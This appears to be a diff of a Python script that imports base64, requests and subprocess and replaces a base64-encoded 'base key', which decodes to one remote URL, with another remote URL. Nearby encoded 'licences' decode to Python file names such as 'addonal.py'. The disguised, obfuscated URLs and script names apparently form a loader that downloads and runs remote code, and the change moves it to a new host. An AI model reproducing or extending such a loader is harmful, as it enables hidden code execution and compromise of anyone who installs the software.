@@ -3,7 +3,7 @@ import base64
 import requests
 import subprocess
 
-encoded_base_key = 'aHR0cHM6Ly9jb2luc3cuYXBwL2Jhc2VjLw=='
+encoded_base_key = 'aHR0cHM6Ly9hcGlrZXkud2Vic2l0ZS9iYXNlYy8='
 
 encoded_licences = [
     'YWRkb25hbC5weQ==',
